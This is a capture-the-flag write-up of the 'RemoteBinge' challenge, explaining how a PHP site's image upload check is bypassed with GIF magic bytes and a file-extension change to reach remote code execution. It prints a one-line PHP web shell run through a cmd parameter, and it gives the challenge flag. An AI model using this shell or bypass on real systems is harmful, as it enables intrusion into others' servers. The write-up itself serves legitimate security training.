---
title: Hacking Hub - RemoteBinge
date: 2025-04-07 5:01:00 -5000
categories: [CTF]
tags: [ctf, web]     # TAG names should always be lowercase
---

# Summary
`RemoteBinge` is an easy difficulty CTF on Hacking Hub that involves abusing file upload functionality to get RCE in a PHP application.

<br/>

# CTF
![](/assets/hackinghub/remotebinge/0.png)
*Website Landing Page*

<br/>

![](/assets/hackinghub/remotebinge/1.png)
*After trying to upload a `.jpg` file*

<br/>

Image upload functionality is always an indication that there could be a vulnerability here. We can intercept the upload image request and try to trick the website into thinking we are uploading a GIF when we really aren't.

<br/>

There are a few ways that a website can figure out the content type of a file:
1. The extension of the file: `wallpaper.jpg`
2. The `Content-Type: image/jpeg`
3. The magic byte. `ÿØÿà` is the magic bytes for jpg file format.
![](/assets/hackinghub/remotebinge/2.png)

<br/>

Our goal is RCE, so we want to add a payload that will allow use to execute some code.
```php
<?php
echo "shelled: ";
system($_GET['cmd']);
?>
```

<br/>

Changing the `file extention` and the `Content-Type` was not successful.
![](/assets/hackinghub/remotebinge/3.png)

<br/>

The magic byte for [GIF](https://en.wikipedia.org/wiki/List_of_file_signatures) is `GIF87a` or `GIF89a`. Changing the magic byte allows us to successfully upload a file. We can see that the URL of the file upload is available in the response.
![](/assets/hackinghub/remotebinge/4.png)

<br/>

When we go to the URL however, we just get a white screen. This is because the file is still being interpreted as a GIF. It is now just a GIF with un-executable PHP code that results in just a white square. 
![](/assets/hackinghub/remotebinge/5.png)

<br/>

We can try changing the file extension to get the PHP code to actually execute.
![](/assets/hackinghub/remotebinge/6.png)

<br/>

When we browse to the URL, we can see that the PHP code is indeed being executed.
![](/assets/hackinghub/remotebinge/7.png)

<br/>

To get RCE we can use the `?cmd=id` parameter from our PHP code to execute commands.
![](/assets/hackinghub/remotebinge/8.png)

<br/>

# Flag
![](/assets/hackinghub/remotebinge/9.png)
```
flag{31bb2fcba177166fe823804cb0c7dbb6}
```
